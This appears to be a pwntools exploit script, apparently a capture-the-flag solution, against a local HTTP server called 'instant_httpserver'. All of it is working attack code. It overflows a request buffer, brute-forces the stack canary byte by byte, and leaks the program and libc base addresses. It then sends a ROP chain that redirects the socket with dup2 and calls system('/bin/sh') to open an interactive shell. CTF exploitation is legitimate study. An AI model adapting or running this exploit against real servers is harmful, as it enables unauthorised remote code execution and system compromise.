### use your libc addresses when you execute this code

from pwn import *
from time import sleep
import socket
import requests

#context.log_level = 'DEBUG'

def slp():
	sleep(0.3)

is_remote = False

if is_remote:
	log.info('This code is not for remote exploit, sorry.')
	exit(0)
else:
	port = 4445
	host = 'localhost'

	### --- These are libc offset addresses of my environment, /lib/x86_64-linux-gnu/libc-2.27.so ---
	write_offset = 0x110140
	binsh_offset = 0x1b3e9a
	system_offset = 0x4f440
	dup2_offset = 0x1109a0
	pop_rdi_ret_offset = 0x2155f
	pop_rsi_ret_offset = 0x23e6a

# -0x210 --- buf
# -0x008 --- canary
# -0x000 --- saved rbp
# +0x008 --- return address

### solve canary
canary = b''
for i in range(8):
	for j in range(0x0, 0x100):
		
		# connect and receive until the responce is correctly received
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + j.to_bytes(1, 'little'))
			slp()
			received = s.recv(256)
			s.close()
			if b'Your' in received:
				break
		
		# if canary[i] found
		if b'instant_httpserver -- localhost' in received:
			canary += j.to_bytes(1, 'little')
			log.info('canary[%d]: 0x%x' % (i, j))
			break
		
		# if canary[i] not found in the iteration
		if j == 0xff:
			log.info('canary[%d] couldn\'t be solved.' % i)
			exit(0)

log.info('canary: {0}'.format(canary))

### text addr leak part 1:
for i in range(0xf):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + b'AAAAAAAA' + (0x1000 * i + 0xde5).to_bytes(2, 'little'))
	slp()
	received = s.recv(256)
	if len(received) >= len('HTTP/1.1 200 OK\r\nServer: instant_httpserver\r\n\r\n<html>Your Req Length is 520') + 5:
		leaked_text_addr = (0x1000 * i + 0xde5).to_bytes(2, 'little')
		break

log.info('leaked_text_addr[0]: 0xe5')
log.info('leaked_text_addr[1]: 0x%x' % leaked_text_addr[1])

### text addr leak part 2:
for i in range(2, 8):
	for j in range(0x0, 0x100):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		s.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + b'AAAAAAAA' + leaked_text_addr + i.to_bytes(1, 'little'))
		slp()
		received = s.recv(256)

		# connect and receive until the responce is correctly received
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + b'AAAAAAAA' + leaked_text_addr + j.to_bytes(1, 'little'))
			slp()
			received = s.recv(256)
			s.close()
			if b'Your' in received:
				break

		# if write() was executed twice, this is a part of the targeted .text address
		if len(received) >= len('HTTP/1.1 200 OK\r\nServer: instant_httpserver\r\n\r\n<html>Your Req Length is 520') + 5:
			leaked_text_addr += j.to_bytes(1, 'little')
			log.info('leaked_text_addr[%d]: 0x%x' % (i, j))
			break
		
		# if canary[i] not found in the iteration
		if j == 0xff:
			log.info('leaked_text_addr[%d] couldn\'t be solved.' % i)
			exit(0)

leaked_text_addr = int.from_bytes(leaked_text_addr, 'little')
text_base = leaked_text_addr - 0xde5
log.info('leaked_text_addr: 0x%x' % leaked_text_addr)
log.info('text_base: 0x%x' % text_base)

ret = text_base + 0xcb3

### leak libc address
pop_rsi_r15_ret_offset = 0xe91
write_got = 0x201f58

p = remote(host, port)
p.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + b'AAAAAAAA' + p64(text_base + pop_rsi_r15_ret_offset) + p64(text_base + write_got) + p64(0) + p64(text_base + 0xde5))
write_libc = int.from_bytes(p.recvuntil(b'\x7f')[-6:], 'little')
p.recv()
libc_base = write_libc - write_offset
log.info('libc_base: 0x%x' % libc_base)

### ROP
rop_code = b''

# dup2(fd, 0) ... fd is pre-set.
rop_code += p64(libc_base + pop_rsi_ret_offset)
rop_code += p64(0x1)
rop_code += p64(ret)
rop_code += p64(libc_base + dup2_offset)

# dup2(fd, 1) ... fd is pre-set.
rop_code += p64(libc_base + pop_rsi_ret_offset)
rop_code += p64(0x0)
rop_code += p64(ret)
rop_code += p64(libc_base + dup2_offset)

# system('/bin/sh')
rop_code += p64(libc_base + pop_rdi_ret_offset)
rop_code += p64(libc_base + binsh_offset)
rop_code += p64(ret)
rop_code += p64(libc_base + system_offset)

p = remote(host, port)
p.send(b'GET' + (b'A' * (0x208 - len(b'GET'))) + canary + b'AAAAAAAA' + rop_code)
p.recv()
p.interactive()
p.close()